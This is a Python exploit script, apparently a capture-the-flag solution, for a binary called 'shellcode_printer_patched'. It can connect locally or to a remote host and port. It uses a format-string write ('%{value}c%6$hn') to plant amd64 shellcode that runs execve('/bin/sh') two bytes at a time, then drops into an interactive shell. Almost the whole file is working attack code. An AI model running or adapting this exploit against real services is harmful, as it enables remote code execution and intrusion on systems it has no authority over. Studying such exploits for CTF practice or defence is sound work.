#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./shellcode_printer_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x145B
brva 0x143F
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

shellcode = asm('''
start:
    xor rbx, rbx
    mov rbx, 0x68732f6e69622f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
jmp start
''', arch='amd64')

print(len(shellcode))

for i in range(0, len(shellcode), 2):
    chunk = shellcode[i:i+2]
    value = int.from_bytes(chunk, 'little')
    pl = f'%{value}c%6$hn'.encode()
    sla(b': ', pl)


if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()
sla(b': ', b'\x00')


interactive()
